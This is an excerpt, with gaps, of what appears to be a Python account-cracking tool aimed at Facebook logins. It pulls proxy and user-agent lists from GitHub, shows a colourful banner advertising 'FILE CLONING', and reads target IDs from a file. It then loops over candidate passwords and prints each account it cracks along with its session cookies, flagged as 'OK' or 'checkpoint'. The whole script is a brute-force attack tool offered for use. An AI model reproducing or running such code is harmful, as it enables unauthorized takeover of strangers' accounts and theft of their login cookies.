...
princp=[]
try:
	prox= requests.get('https://github.com/Norokfj/Api/blob/main/prox.txt').text
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MAMA-143/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
while attemps < 12345677901:
    ...
    if username == 'No' and password == 'Rok':
...
\33[1;91m| $$  $$$$| $$  | $$| $$__  $$| $$  | $$| $$  $$  
 \33[1;34m| $$\  $$$| $$  | $$| $$  \ $$| $$  | $$| $$\  $$ 
\33[1;36m| $$ \  $$|  $$$$$$/| $$  | $$|  $$$$$$/| $$ \  $$
\33[1;33m|__/  \__/ \______/ |__/  |__/ \______/ |__/  \__/
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • Innocent Boy SH4MUL   FIRE (😎)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [ 11.0 ] FIRE (🥵)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/innocentN.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#NOROK-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•NOROK-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#MAMA-King
				print(f'\r\033[0;92m[NOROK-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " NOROK,  Ok,  id"')
